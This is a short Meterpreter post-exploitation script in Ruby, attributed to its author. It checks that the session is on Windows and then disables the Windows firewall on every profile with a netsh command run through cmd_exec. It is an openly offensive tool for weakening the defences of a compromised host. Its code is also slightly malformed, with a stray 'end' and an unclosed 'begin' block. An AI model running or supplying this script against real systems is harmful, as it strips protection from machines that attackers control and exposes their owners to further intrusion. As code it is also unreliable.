# Author: Abhinav Singh
# Windows Firewall De-Activator

#Option/parameter Parsing

opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Meterpreter Script for disabling the Default windows Firelwall"
		print_line "Let's hope it works"
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}

# OS validation and command execution

unsupported if client.platform !~ /win32|win64/i
	end
	begin
		print_status("disabling the default firewall")
		cmd_exec('cmd /c','netsh advfirewall set AllProfiles state off',5)
